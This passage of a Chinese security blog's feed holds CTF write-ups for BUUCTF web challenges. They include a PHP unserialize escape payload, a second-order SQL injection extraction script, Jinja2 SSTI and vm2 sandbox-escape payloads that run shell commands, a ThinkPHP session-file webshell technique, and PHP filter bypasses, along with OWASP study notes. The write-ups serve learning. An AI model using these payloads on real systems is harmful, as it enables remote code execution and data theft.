username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code>      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179326/17/1720/143813/608c2f0bEd5a3e0ed/156a14c371a68116.png" alt="02.png"></p><p>可以看到长度为263       </p><p>在双引号中加入263个union，或者其他（那个safe函数中的，只要凑够263即可）      </p><p>经过safe函数后，就多出263个，就将原来的263个逃逸出来了       </p><p>最终payload：</p><pre><code>   age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;        </code></pre><p>在<code>update.php</code>页面POST提交，重新登录（admin，密码随意）得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;unserialize-char-escape&quot;&gt;&lt;a href=&quot;#unserialize-char-escape&quot; class=&quot;headerlink&quot; title=&quot;unserialize char-escape&quot;&gt;&lt;/a&gt;unserialize char-</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="unserialize" scheme="http://lll-nnn.github.io/categories/CTF/unserialize/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="unserialize" scheme="http://lll-nnn.github.io/tags/unserialize/"/>
    
    <category term="char.escape" scheme="http://lll-nnn.github.io/tags/char-escape/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Unfinish</title>
    <link href="http://lll-nnn.github.io/2021/04/29/BUU79/"/>
    <id>http://lll-nnn.github.io/2021/04/29/BUU79/</id>
    <published>2021-04-29T15:46:01.000Z</published>
    <updated>2021-04-29T16:35:29.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQL-二次注入"><a href="#SQL-二次注入" class="headerlink" title="SQL 二次注入"></a>SQL 二次注入</h2><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181130/17/1544/29996/608ad77eE7e059785/fcb10cb3973eb937.png" alt="01.png">      </p><p>URL为：<code>http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php</code>     </p><p>有<code>login.php</code>,看下有没有<code>register.php</code>      </p><p>果然      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/189730/22/621/29267/608ad7f4Eb2fe540a/175965ef798babd3.png" alt="02.png"><br>随便注册个看看<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png" alt="03.png"><br>可以看到在侧边栏这里显示了我们的用户名          </p><p>二次注入       </p><p>过滤了<code>,</code>和<code>information</code><br>所以没法报错注了     </p><p>新姿势<code>0&#39;+hex(hex(database()))+&#39;0</code>       </p><p>之所以要两次hex编码是因为，一次编码产生的结果里可能有字母，加0后就成了字母前面的纯数字      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/186262/16/1480/306644/608ad9e5Eb3f7074c/bf9784e6e02681be.png" alt="04.png">        </p><p>数字过大转为了科学计数法       </p><p>用substr,<code>,</code>被过，变为<code>from x for x</code>       </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185436/35/1509/304850/608ada67E0214a5f5/8198055dc97e7fa4.png" alt="05.png">        </p><p>也可以<code>ascii(substr(database() from 1 for 1))</code></p><p>得到database()是web       </p><p>但information被过，所以没法读表啥的        </p><p>看别人WP都是猜的<code>select * from flag</code>      </p><p>(啊这)    </p><p>最后写个脚本跑一下     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleepflag = <span class="hljs-string">&#x27;&#x27;</span>url = <span class="hljs-string">&#x27;http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/&#x27;</span>url1 = url+<span class="hljs-string">&#x27;register.php&#x27;</span>url2 = url+<span class="hljs-string">&#x27;login.php&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):    sleep(<span class="hljs-number">0.3</span>)    data1 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-built_in">format</span>(        i), <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;    data2 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;    r1 = requests.post(url1, data=data1)    r2 = requests.post(url2, data=data2)    res = re.search(<span class="hljs-string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, r2.text)    res1 = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, res.group())    flag = flag+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(res1.group()))    print(flag)</code></pre></code></pre><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175950/30/7065/148511/608adb94E422ae4f9/34785ddab5c3f6fc.png" alt="06.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQL-二次注入&quot;&gt;&lt;a href=&quot;#SQL-二次注入&quot; class=&quot;headerlink&quot; title=&quot;SQL 二次注入&quot;&gt;&lt;/a&gt;SQL 二次注入&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://img11.360buyimg.com/ddimg/jf</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="SQL" scheme="http://lll-nnn.github.io/categories/CTF/SQL/"/>
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="SQL" scheme="http://lll-nnn.github.io/tags/SQL/"/>
    
    <category term="二次注入" scheme="http://lll-nnn.github.io/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Double Secret</title>
    <link href="http://lll-nnn.github.io/2021/04/27/BUU78/"/>
    <id>http://lll-nnn.github.io/2021/04/27/BUU78/</id>
    <published>2021-04-27T07:42:47.000Z</published>
    <updated>2021-04-27T08:46:02.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="_-__-"></a><code>_-__-</code></h2><p>打开是这样<br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png" alt="01.png">       </p><p>各种找，发现<code>robots.txt</code><br>有一句话—–<code>It is Android ctf</code><br>????    </p><p>然后就扫目录，<code>/secrect</code>      </p><p>得到：<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>       </p><p>传入参数：<code>?secrect=123</code><br>—-&gt;<code>d]</code>      </p><p>然后试试其他的，感觉也没什么规律        </p><p>当我输了一个大的数后，  报错了<br><code>?secrect=123123</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/164560/32/20921/70003/6087c295Ee2b4b2b0/3375b41da3b33055.png" alt="02.png"><br>然后就不知道怎么继续了     </p><p>WP       </p><p>主要点：<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" alt="03.png">      </p><p>对传入的参数进行RC4解密，然后经过<code>render_template_string</code><br>这里存在SSTI      </p><p>RC4加密脚本         </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):</span>  <span class="hljs-comment"># 返回加密后得内容</span>    s_box = rc4_init_sbox(key)    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))    <span class="hljs-keyword">return</span> crypt<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))    j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>        s_box[i], s_box[j] = s_box[j], s_box[i]    <span class="hljs-keyword">return</span> s_box<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span>    res = []    i = j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        j = (j + box[i]) % <span class="hljs-number">256</span>        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % <span class="hljs-number">256</span>        k = box[t]        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>)key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># 此处为密文</span>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)enc_base64 = rc4_main(key, message)enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)enc_url = parse.quote(enc_init)print(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)<span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></code></pre></code></pre><p>明文输入SSTI的payload：<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" alt="05.png">      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" alt="04.png">        </p><p>虽然有个报错（那个safe函数），但还是得到了结果。</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>得到flag       </p><p><a href="https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control">Rc4加密</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;_-__-&quot;&gt;&lt;/a&gt;&lt;code&gt;_-__-&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;打开是这样&lt;br&gt;&lt;img src=&quot;https://img10.360buyimg.com/ddimg/jf</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>I_&lt;3_Flask</title>
    <link href="http://lll-nnn.github.io/2021/04/26/BUU77/"/>
    <id>http://lll-nnn.github.io/2021/04/26/BUU77/</id>
    <published>2021-04-26T13:02:48.000Z</published>
    <updated>2021-04-26T13:13:37.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1_1"></a>1_1</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png" alt="01.png">       </p><p>题目是flask，应该是SSTI了吧<br>但没参数        </p><p><a href="https://github.com/rakjong/Arjun"><code>arjun</code></a><br>这个可以来爆破参数<br>先下载，然后到arjun目录下<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png" alt="02.png">       </p><p>安装<br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png" alt="03.png">        </p><p>使用<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png" alt="04.png">        </p><p>爆破出参数是name        </p><p>除此之外就没啥了<br>payload：<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>       </p><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>两个都行<img src="https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png" alt="05.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-1&quot;&gt;&lt;a href=&quot;#1-1&quot; class=&quot;headerlink&quot; title=&quot;1_1&quot;&gt;&lt;/a&gt;1_1&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nep2</title>
    <link href="http://lll-nnn.github.io/2021/04/25/nep2/"/>
    <id>http://lll-nnn.github.io/2021/04/25/nep2/</id>
    <published>2021-04-25T12:11:54.000Z</published>
    <updated>2021-04-25T13:22:48.243Z</updated>
    
    <content type="html"><![CDATA[<p>视频二：<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）</p><pre><code>1. Injection----&gt;注入，Sql，nosql,OS injection,LDAP injection       2. Broken Authentication---&gt;失效的身份认证和会话管理3. Sensitive Data Exposure----&gt;敏感数据泄露4. XXE5. Broken Access Control----&gt;越权6. Security Misconfiguration.---&gt;安全配置   7. XSS8. Insecure Deserialization----&gt;不安全的反序列化9. Using Components with Known Vulnerabilities----&gt;使用不安全的组件 10. Insufficient Logging &amp; Monitoring.----&gt;日志和监控不足严重程度</code></pre><p>2.请翻译一下credential stuffing（1分）</p><pre><code>密码嗅探    </code></pre><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965">credential stuffing attack—-&gt;撞库</a></p><p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）</p><pre><code>日志记录不足，会使攻击者进一步攻击系统，保持持久性       owasp tenth</code></pre><p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）   </p><pre><code>利用owasp testing guide check-list查找到相关部分进行学习      小白，还没渗透过。。。。。。。。。         </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频二：&lt;a href=&quot;https://www.hacker101.com/sessions/pentest_owasp&quot;&gt;https://www.hacker101.com/sessions/pentest_owasp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1.目前owasp的十大we</summary>
      
    
    
    
    
    <category term="note" scheme="http://lll-nnn.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>JustEscape</title>
    <link href="http://lll-nnn.github.io/2021/04/25/BUU76/"/>
    <id>http://lll-nnn.github.io/2021/04/25/BUU76/</id>
    <published>2021-04-25T09:07:03.000Z</published>
    <updated>2021-04-25T09:21:54.868Z</updated>
    
    <content type="html"><![CDATA[<h2 id="js-vm2"><a href="#js-vm2" class="headerlink" title="js vm2"></a>js vm2</h2><p><img src="https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png" alt="01.png">      </p><p>下面两个demo     </p><p>看下<code>run.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>试了下，感觉什么都执行不了     </p><p>前面提示说<code>真的是 PHP 嘛</code><br>难道不是PHP      </p><p>看下WP   </p><p>是js      </p><p>js还不会，先简单记一下吧，等学学再回来看看     </p><p><a href="https://www.anquanke.com/post/id/207291"><code>js  vm2沙箱逃逸</code></a>      </p><p>payload:   </p><pre><code>code = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(code));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>绕过：<code>[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]</code>      </p><pre><code>?code=(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;js-vm2&quot;&gt;&lt;a href=&quot;#js-vm2&quot; class=&quot;headerlink&quot; title=&quot;js vm2&quot;&gt;&lt;/a&gt;js vm2&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://sc01.alicdn.com/kf/H375cdea26ac54e8c</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>EasyThinking</title>
    <link href="http://lll-nnn.github.io/2021/04/24/BUU75/"/>
    <id>http://lll-nnn.github.io/2021/04/24/BUU75/</id>
    <published>2021-04-24T08:57:53.000Z</published>
    <updated>2021-04-24T09:27:32.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-_-"></a>-_-</h2><p>看到thinking应该想到应该是thinkphp吧<br>输入个不存在的路径<br>报错：       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png" alt="01.png">     </p><p><a href="https://paper.seebug.org/1114/">Think PHP V6.0.0任意文件操作漏洞</a>       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png" alt="02.png">    </p><p>32位的PHPSESSID改成一个32位的PHP文件名  </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png" alt="03.png">      </p><p>搜索里面填入一句话      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png" alt="04.png"><br>就会被存放到之前写的文件里面<br>访问<code>http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php</code><br>最后的文件名是<code>sess_</code>+刚才的32位    </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png" alt="05.png">      </p><p>还要绕过<code>disable_function</code><br>和之前那道题一样        </p><p>我的蚁剑出问题了      </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105160796/">之后</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;-_-&quot;&gt;&lt;/a&gt;-_-&lt;/h2&gt;&lt;p&gt;看到thinking应该想到应该是thinkphp吧&lt;br&gt;输入个不存在的路径&lt;br&gt;报错：       &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;h</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>EzPHP</title>
    <link href="http://lll-nnn.github.io/2021/04/23/BUU74/"/>
    <id>http://lll-nnn.github.io/2021/04/23/BUU74/</id>
    <published>2021-04-23T14:43:34.000Z</published>
    <updated>2021-04-25T05:02:03.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-*-"></a>-*-</h2><p>代码审计    </p><pre><code>```php &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#39;shana&#39;];$passwd = $_GET[&#39;passwd&#39;];$arg = &#39;&#39;;$code = &#39;&#39;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?```     </code></pre><p>首先第一层：      </p><pre><code>if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;</code></pre><p>url编码可以绕过，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>接受？后的，不会对其url解码     </p><p>第二层：       </p><pre><code>if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);     </code></pre><p>第二个匹配可以最后加%0a绕过      </p><p>第三层：</p><pre><code>if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125;</code></pre><p>绕过<code>$_REQUEST</code><br><code>$_REQUEST 同时接受 GET 和 POST 的数据，并且 POST 具有更高的优先值</code><br>所以可以POST数字来绕过<br><code>POST：debu=1&amp;&amp;file=1 </code>   </p><pre><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);         </code></pre><p>data协议<code>data://text/plain,debu_debu_aqua</code><br><code>debu_debu_aqua</code>记得URL编码        </p><p>第四层：     </p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;       </code></pre><p>数组绕过     </p><p><code>shana[]=1&amp;passwd[]=2</code><br>URL编码     </p><p>第五层：    </p><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 